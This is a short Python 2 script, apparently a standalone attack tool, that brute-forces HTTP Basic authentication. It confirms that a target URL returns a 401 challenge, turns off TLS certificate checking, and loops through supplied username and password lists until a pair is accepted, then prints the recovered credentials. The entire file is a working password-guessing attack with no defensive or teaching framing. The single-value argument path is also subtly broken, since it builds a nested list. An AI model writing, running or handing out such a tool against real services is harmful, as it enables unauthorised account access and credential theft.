#!/usr/bin/python2

#
#
#

import argparse
import urllib2
import os.path
import base64
import sys
import ssl
import re

from datetime import datetime

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

class HTTP_Auth_Attack(object):

    def __init__(self, host, userlist, passlist):
        self.host = host
        self.userlist = self.parse_list(userlist)
        self.passlist = self.parse_list(passlist)

    def parse_list(self, list):
        if os.path.isfile(list):
            ret = ([line.rstrip('\n') for line in open(list)])
        else:
            ret = []
            ret.append([list])
        return ret

    def smash_auth(self):
        req = urllib2.Request(self.host)
        try:
            handle = urllib2.urlopen(req, context=ctx)
        except IOError, e:
            #we want this to occur
            pass
        else:
            print("[x] This page is not protected by authentication")
            sys.exit(1)

        if not hasattr(e, 'code') or e.code !=401:
            print("[x] This page is not providing us a 401 reply.. Exiting")
            #print("%s") % (e.headers)
            sys.exit(1)

        auth_headers = e.headers['www-authenticate']
        auth_object  = re.compile(r'''(?:\s*www-authenticate\s*:)?\s*(\w*)\s+realm=['"]([^'"]+)['"]''', re.IGNORECASE)
        match_object = auth_object.match(auth_headers)

        if not match_object:
            print "[x] The authentication header is fucked up.. Exiting."
            print "[x] Malformed Header: " + auth_headers
            sys.exit(1)

        auth_scheme = match_object.group(1)
        auth_realm  = match_object.group(2)

        for _user in self.userlist:
            for _pass in self.passlist:
                cred = base64.encodestring('%s:%s' % (_user, _pass))[:-1]
                auth_header = "Basic %s" % cred
                req.add_header("Authorization", auth_header)

                try:
                    print("Attempting Break with user '%s' and password '%s'") % (_user, _pass)
                    handle = urllib2.urlopen(req, context=ctx)
                except:
                    pass
                else:
                    print("----\n")
                    print("[!] Username: '%s' | Password: '%s' FOUND!\n") % (_user, _pass)
                    print("----\n")
                    sys.exit(0)



if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    auth_group = parser.add_argument_group("Required Arguments")
    auth_group.add_argument('-t', required="true", dest="target", help="Target URL running Web Authentication")
    auth_group.add_argument('-u', required="true", dest="userlist", help="A username or a file containing a list of users")
    auth_group.add_argument('-p', required="true", dest="passlist", help="A password or a file containing a list of passwords")
    args = parser.parse_args()

    obj = HTTP_Auth_Attack(args.target, args.userlist, args.passlist)
    obj.smash_auth()